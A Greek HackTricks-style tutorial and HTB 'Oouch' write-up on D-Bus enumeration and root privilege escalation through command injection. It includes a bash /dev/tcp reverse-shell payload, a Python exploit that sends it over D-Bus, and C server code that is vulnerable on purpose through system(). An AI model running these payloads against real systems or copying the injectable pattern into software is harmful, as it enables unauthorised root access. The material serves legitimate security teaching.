# Απαρίθμηση D-Bus & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **Απαρίθμηση μέσω GUI**

Το D-Bus χρησιμοποιείται ως διαμεσολαβητής επικοινωνίας μεταξύ διεργασιών (IPC) σε desktop περιβάλλοντα Ubuntu. Στο Ubuntu παρατηρείται η ταυτόχρονη λειτουργία πολλών message buses: του system bus, που χρησιμοποιείται κυρίως από **προνομιούχες υπηρεσίες για την έκθεση υπηρεσιών σχετικών με ολόκληρο το σύστημα**, και ενός session bus για κάθε συνδεδεμένο χρήστη, που εκθέτει υπηρεσίες σχετικές μόνο με τον συγκεκριμένο χρήστη. Η εστίαση εδώ είναι κυρίως στο system bus, λόγω της συσχέτισής του με υπηρεσίες που εκτελούνται με υψηλότερα privileges (π.χ. root), καθώς ο στόχος μας είναι η αύξηση των privileges. Σημειώνεται ότι η αρχιτεκτονική του D-Bus χρησιμοποιεί έναν «router» ανά session bus, ο οποίος είναι υπεύθυνος για την ανακατεύθυνση των μηνυμάτων των clients προς τις κατάλληλες υπηρεσίες, με βάση τη διεύθυνση που καθορίζουν οι clients για την υπηρεσία με την οποία θέλουν να επικοινωνήσουν.<sup>[[1]](#references)</sup>

Οι υπηρεσίες στο D-Bus ορίζονται από τα **objects** και τα **interfaces** που εκθέτουν. Τα objects μπορούν να παρομοιαστούν με instances κλάσεων σε τυπικές γλώσσες OOP, όπου κάθε instance αναγνωρίζεται μοναδικά από ένα **object path**. Αυτό το path, παρόμοιο με ένα filesystem path, αναγνωρίζει μοναδικά κάθε object που εκθέτει η υπηρεσία. Ένα βασικό interface για σκοπούς έρευνας είναι το **org.freedesktop.DBus.Introspectable** interface, το οποίο διαθέτει μία μόνο μέθοδο, την Introspect. Αυτή η μέθοδος επιστρέφει μια XML αναπαράσταση των methods, signals και properties που υποστηρίζει το object, με έμφαση εδώ στα methods και παράλειψη των properties και signals.

Για την επικοινωνία με το D-Bus interface χρησιμοποιήθηκαν δύο εργαλεία: ένα CLI tool με το όνομα **gdbus**, για την εύκολη κλήση των methods που εκτίθενται από το D-Bus σε scripts, και το [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ένα GUI tool βασισμένο σε Python, σχεδιασμένο για την απαρίθμηση των υπηρεσιών που είναι διαθέσιμες σε κάθε bus και την εμφάνιση των objects που περιέχονται σε κάθε υπηρεσία.
```bash
sudo apt-get install d-feet
```
Αν ελέγχετε το **session bus**, επιβεβαιώστε πρώτα την τρέχουσα διεύθυνση:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Στην πρώτη εικόνα εμφανίζονται οι services που είναι registered στο D-Bus system bus, με το **org.debin.apt** να επισημαίνεται συγκεκριμένα μετά την επιλογή του κουμπιού System Bus. Το D-Feet κάνει query σε αυτήν τη service για objects, εμφανίζοντας interfaces, methods, properties και signals για τα επιλεγμένα objects, όπως φαίνεται στη δεύτερη εικόνα. Εμφανίζεται επίσης λεπτομερώς το signature κάθε method.

Ένα αξιοσημείωτο χαρακτηριστικό είναι η εμφάνιση του **process ID (pid)** και της **command line** της service, κάτι χρήσιμο για την επιβεβαίωση του αν η service εκτελείται με elevated privileges, γεγονός σημαντικό για τη συνάφεια της έρευνας.

Το **D-Feet επιτρέπει επίσης την invocation methods**: οι χρήστες μπορούν να εισαγάγουν Python expressions ως παραμέτρους, τις οποίες το D-Feet μετατρέπει σε D-Bus types πριν τις προωθήσει στη service.

Ωστόσο, σημειώστε ότι ορισμένες methods απαιτούν authentication πριν μας επιτρέψουν να τις κάνουμε invoke. Θα αγνοήσουμε αυτές τις methods, καθώς ο στόχος μας εξαρχής είναι να κάνουμε elevate τα privileges μας χωρίς credentials.

Σημειώστε επίσης ότι ορισμένες services κάνουν query σε μια άλλη D-Bus service με το όνομα org.freedeskto.PolicyKit1, για να καθορίσουν αν ένας χρήστης θα πρέπει να επιτρέπεται να εκτελέσει συγκεκριμένες actions.

## **Enumeration Cmd line**

### List Service Objects

Είναι δυνατή η λίστα των opened D-Bus interfaces με:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Οι υπηρεσίες που επισημαίνονται ως **`(activatable)`** είναι ιδιαίτερα ενδιαφέρουσες, επειδή **δεν εκτελούνται ακόμη**, αλλά ένα αίτημα στο bus μπορεί να τις εκκινήσει κατά απαίτηση. Μην περιορίζεστε στο `busctl list`; αντιστοιχίστε αυτά τα ονόματα στα πραγματικά binaries που θα εκτελούσαν.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Αυτό σας δείχνει γρήγορα ποια διαδρομή `Exec=` θα εκκινηθεί για ένα activatable name και υπό ποια ταυτότητα. Αν το binary ή η αλυσίδα εκτέλεσής του προστατεύεται ανεπαρκώς, μια ανενεργή υπηρεσία μπορεί και πάλι να αποτελέσει διαδρομή για privilege escalation.

#### Συνδέσεις

[Από τη Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Όταν μια διεργασία δημιουργεί μια σύνδεση σε ένα bus, το bus εκχωρεί στη σύνδεση ένα ειδικό bus name που ονομάζεται _unique connection name_. Τα bus names αυτού του τύπου είναι immutable—είναι εγγυημένο ότι δεν θα αλλάξουν όσο υπάρχει η σύνδεση—and, το σημαντικότερο, δεν μπορούν να επαναχρησιμοποιηθούν κατά τη διάρκεια ζωής του bus. Αυτό σημαίνει ότι καμία άλλη σύνδεση σε αυτό το bus δεν θα λάβει ποτέ το ίδιο unique connection name, ακόμη και αν η ίδια διεργασία κλείσει τη σύνδεση με το bus και δημιουργήσει μια νέα. Τα unique connection names αναγνωρίζονται εύκολα, επειδή ξεκινούν με τον χαρακτήρα colon—ο οποίος κατά τα άλλα απαγορεύεται.<sup>[[4]](#references)</sup>

### Πληροφορίες Service Object

Στη συνέχεια, μπορείτε να λάβετε ορισμένες πληροφορίες για το interface με:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Επίσης, συσχετίστε το όνομα του bus με τη μονάδα `systemd` και τη διαδρομή του εκτελέσιμου:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Αυτό απαντά στο λειτουργικό ερώτημα που έχει σημασία κατά το privesc: **αν μια method call πετύχει, ποιο πραγματικό binary και ποιο unit θα εκτελέσουν την ενέργεια;**

### List Interfaces of a Service Object

Πρέπει να έχετε επαρκή permissions.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Ενδοσκόπηση Διεπαφής ενός Service Object

Σημειώστε ότι σε αυτό το παράδειγμα επιλέχθηκε η πιο πρόσφατη διεπαφή που εντοπίστηκε, χρησιμοποιώντας την παράμετρο `tree` (_δείτε την προηγούμενη ενότητα_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Σημειώστε τη μέθοδο `.Block` του interface `htb.oouch.Block` (αυτή που μας ενδιαφέρει). Το "s" των άλλων στηλών μπορεί να σημαίνει ότι αναμένει ένα string.

Πριν δοκιμάσετε κάτι επικίνδυνο, επικυρώστε πρώτα μια **read-oriented** ή, διαφορετικά, low-risk μέθοδο. Αυτό διαχωρίζει με σαφήνεια τρεις περιπτώσεις: λανθασμένο syntax, προσβάσιμη αλλά απορριφθείσα, ή προσβάσιμη και επιτρεπόμενη.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Συσχέτιση D-Bus Methods με Policies και Actions

Η introspection σάς δείχνει **τι** μπορείτε να καλέσετε, αλλά δεν σας δείχνει **γιατί** μια κλήση επιτρέπεται ή απορρίπτεται. Για πραγματικό privesc triage συνήθως χρειάζεται να εξετάσετε **και τα τρία επίπεδα μαζί**:

1. **Μεταδεδομένα ενεργοποίησης** (`.service` files ή `SystemdService=`) για να μάθετε ποιο binary και ποιο unit θα εκτελεστούν στην πράξη.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) για να μάθετε ποιος μπορεί να κάνει `own`, `send_destination` ή `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) για να μάθετε το προεπιλεγμένο authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Χρήσιμες εντολές:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Μην υποθέτετε αντιστοίχιση 1:1 μεταξύ μιας μεθόδου D-Bus και μιας ενέργειας Polkit. Η ίδια μέθοδος μπορεί να επιλέγει διαφορετική ενέργεια ανάλογα με το αντικείμενο που τροποποιείται ή το context κατά το runtime. Επομένως, η πρακτική ροή εργασίας είναι:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` και αναζήτηση στα σχετικά αρχεία `.policy`
3. probes χαμηλού ρίσκου σε live περιβάλλον με `busctl call`, `gdbus call` ή `dbusmap --enable-probes --null-agent`

Οι Proxy ή compatibility services χρειάζονται ιδιαίτερη προσοχή. Ένας **Proxy που εκτελείται ως root** και προωθεί αιτήματα σε άλλη υπηρεσία D-Bus μέσω της δικής του προεγκατεστημένης σύνδεσης μπορεί κατά λάθος να κάνει το backend να θεωρεί ότι κάθε αίτημα προέρχεται από το UID 0, εκτός αν επαληθεύεται ξανά η ταυτότητα του αρχικού caller.<sup>[[3]](#references)</sup>

### Διεπαφή Παρακολούθησης/Καταγραφής

Με επαρκή privileges (μόνο τα privileges `send_destination` και `receive_sender` δεν αρκούν) μπορείτε να **παρακολουθήσετε μια επικοινωνία D-Bus**.

Για να **παρακολουθήσετε** μια **επικοινωνία**, θα χρειαστεί να είστε **root.** Αν εξακολουθείτε να αντιμετωπίζετε προβλήματα ενώ είστε root, ελέγξτε τα [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) και [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Αν γνωρίζετε πώς να ρυθμίσετε ένα αρχείο ρυθμίσεων D-Bus ώστε να **επιτρέπει σε μη root χρήστες να κάνουν sniffing** της επικοινωνίας, παρακαλώ **επικοινωνήστε μαζί μου**!

Διαφορετικοί τρόποι παρακολούθησης:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Στο ακόλουθο παράδειγμα, το interface `htb.oouch.Block` παρακολουθείται και **το μήνυμα "**_**lalalalal**_**" αποστέλλεται μέσω miscommunication**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Μπορείτε να χρησιμοποιήσετε το `capture` αντί για το `monitor` για να αποθηκεύσετε τα αποτελέσματα σε ένα αρχείο **pcapng** που μπορεί να ανοίξει το Wireshark:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Φιλτράρισμα όλου του θορύβου <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Αν υπάρχει υπερβολικά μεγάλη ποσότητα πληροφοριών στον δίαυλο, περάστε έναν κανόνα αντιστοίχισης ως εξής:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Μπορούν να καθοριστούν πολλοί κανόνες. Αν ένα μήνυμα ταιριάζει με _οποιονδήποτε_ από τους κανόνες, το μήνυμα θα εκτυπωθεί. Ως εξής:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Για περισσότερες πληροφορίες σχετικά με τη σύνταξη των match rules, ανατρέξτε στην [τεκμηρίωση του D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html).<sup>[[7]](#references)</sup>

### Περισσότερα

Το `busctl` διαθέτει ακόμη περισσότερες επιλογές, [**βρείτε τις όλες εδώ**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Ευάλωτο σενάριο**

Ως χρήστης **qtc μέσα στο host "oouch" από το HTB**, μπορείτε να βρείτε ένα **μη αναμενόμενο αρχείο ρυθμίσεων του D-Bus** στη διαδρομή _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Σημειώστε από την προηγούμενη ρύθμιση ότι **θα πρέπει να είστε ο χρήστης `root` ή `www-data` για να στέλνετε και να λαμβάνετε πληροφορίες** μέσω αυτής της επικοινωνίας D-BUS.

Ως χρήστης **qtc** μέσα στο docker container **aeb4525789d8**, μπορείτε να βρείτε κώδικα σχετικό με το dbus στο αρχείο _/code/oouch/routes.py._ Αυτός είναι ο ενδιαφέρων κώδικας:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Όπως μπορείτε να δείτε, **συνδέεται σε ένα D-Bus interface** και στέλνει στο **"Block" function** το "client_ip".

Στην άλλη πλευρά της σύνδεσης D-Bus εκτελείται κάποιο C compiled binary. Αυτός ο κώδικας **ακούει** στη σύνδεση D-Bus **για μια διεύθυνση IP και καλεί το iptables μέσω της `system` function** για να αποκλείσει τη δεδομένη διεύθυνση IP.\
Η **κλήση στη `system` είναι σκόπιμα ευάλωτη σε command injection**, επομένως ένα payload όπως το παρακάτω θα δημιουργήσει ένα reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Στο τέλος αυτής της σελίδας μπορείτε να βρείτε τον **πλήρη C code της D-Bus application**. Σε αυτόν μπορείτε να βρείτε, μεταξύ των γραμμών 91-97, **τον τρόπο με τον οποίο καταχωρούνται το `D-Bus object path`** **και το `interface name`**. Αυτές οι πληροφορίες θα είναι απαραίτητες για την αποστολή δεδομένων στη σύνδεση D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Επίσης, στη γραμμή 57 μπορείτε να δείτε ότι **η μόνη καταχωρισμένη μέθοδος** για αυτή την επικοινωνία D-Bus ονομάζεται `Block`(_**Γι' αυτό, στην ακόλουθη ενότητα, τα payloads θα σταλούν στο αντικείμενο υπηρεσίας `htb.oouch.Block`, στο interface `/htb/oouch/Block` και στο όνομα μεθόδου `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Ο ακόλουθος κώδικας python θα στείλει το payload στη σύνδεση D-Bus, στη μέθοδο `Block`, μέσω του `block_iface.Block(runme)` (_σημειώστε ότι εξήχθη από το προηγούμενο τμήμα κώδικα_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl και dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- Το `dbus-send` είναι ένα εργαλείο που χρησιμοποιείται για την αποστολή μηνυμάτων στο “Message Bus”.
- Message Bus – Λογισμικό που χρησιμοποιείται από τα συστήματα για να διευκολύνει την επικοινωνία μεταξύ εφαρμογών. Σχετίζεται με το Message Queue (τα μηνύματα ταξινομούνται σε σειρά), αλλά στο Message Bus τα μηνύματα αποστέλλονται με subscription model και είναι επίσης πολύ γρήγορα.
- Το “-system” tag χρησιμοποιείται για να δηλώσει ότι πρόκειται για system message και όχι για session message (από προεπιλογή).
- Το “–print-reply” tag χρησιμοποιείται για να εμφανίσει το μήνυμά μας κατάλληλα και να λάβει τυχόν απαντήσεις σε μορφή αναγνώσιμη από τον άνθρωπο.
- Το “–dest=Dbus-Interface-Block” είναι η διεύθυνση του Dbus interface.
- Το “–string:” δηλώνει τον τύπο του μηνύματος που θέλουμε να στείλουμε στο interface. Υπάρχουν διάφορες μορφές αποστολής μηνυμάτων, όπως double, bytes, booleans, int και objpath. Από αυτές, το “object path” είναι χρήσιμο όταν θέλουμε να στείλουμε τη διαδρομή ενός αρχείου στο Dbus interface. Σε αυτή την περίπτωση μπορούμε να χρησιμοποιήσουμε ένα special file (FIFO) για να περάσουμε μια εντολή στο interface ως όνομα αρχείου. Το “string:;” χρησιμοποιείται για να καλέσει ξανά το object path, όπου τοποθετούμε το FIFO reverse shell file/command.

_Σημειώστε ότι στο `htb.oouch.Block.Block`, το πρώτο μέρος (`htb.oouch.Block`) αναφέρεται στο service object και το τελευταίο μέρος (`.Block`) αναφέρεται στο όνομα της μεθόδου._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Βοηθήματα Αυτοματοποιημένης Enumeration (2023-2025)

Η χειροκίνητη Enumeration μιας μεγάλης επιφάνειας επίθεσης D-Bus με `busctl`/`gdbus` γίνεται γρήγορα κουραστική. Δύο μικρά FOSS utilities που κυκλοφόρησαν τα τελευταία χρόνια μπορούν να επιταχύνουν τη διαδικασία κατά τη διάρκεια red-team ή CTF engagements:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Γραμμένο σε C· single static binary (<50 kB) που διατρέχει κάθε object path, ανακτά το XML του `Introspect` και το αντιστοιχίζει στο PID/UID που το κατέχει.<sup>[[5]](#references)</sup>
* Χρήσιμα flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Το tool επισημαίνει τα μη προστατευμένα well-known names με `!`, αποκαλύπτοντας άμεσα services που μπορείς να *own* (να καταλάβεις) ή method calls που είναι προσβάσιμα από unprivileged shell.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Python-only script που αναζητά *writable* paths σε systemd units και υπερβολικά permissive D-Bus policy files (π.χ. `send_destination="*"`).<sup>[[6]](#references)</sup>
* Γρήγορη χρήση:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Το D-Bus module αναζητά στους παρακάτω καταλόγους και επισημαίνει οποιοδήποτε service μπορεί να γίνει spoofed ή hijacked από έναν κανονικό user:
* `/etc/dbus-1/system.d/` και `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Αξιοσημείωτα D-Bus Bugs Privilege Escalation (2024-2025)

Η παρακολούθηση πρόσφατα δημοσιευμένων CVEs βοηθά στον εντοπισμό παρόμοιων insecure patterns σε custom code. Δύο καλά πρόσφατα παραδείγματα είναι:<sup>[[2]](#references)[[3]](#references)</sup>

| Έτος | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Το service που εκτελείται ως root εξέθετε ένα D-Bus interface το οποίο μπορούσαν να επαναρυθμίσουν unprivileged users, συμπεριλαμβανομένης της φόρτωσης attacker-controlled macro behavior. | Αν ένα daemon εκθέτει **device/profile/config management** στο system bus, αντιμετώπισε τη writable configuration και τα macro features ως primitives για code execution και όχι απλώς ως "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Ένα root-running compatibility proxy προωθούσε requests σε backend services χωρίς να διατηρεί το αρχικό security context του caller, με αποτέλεσμα τα backends να εμπιστεύονται το proxy ως UID 0. | Αντιμετώπισε τα **proxy / bridge / compatibility** D-Bus services ως ξεχωριστή bug class: αν μεταβιβάζουν privileged calls, επαλήθευσε πώς το caller UID/Polkit context φτάνει στο backend. |

Patterns που πρέπει να προσέξεις:
1. Το service εκτελείται **ως root στο system bus**.
2. Είτε **δεν υπάρχει authorization check**, είτε ο έλεγχος πραγματοποιείται για το **λάθος subject**.
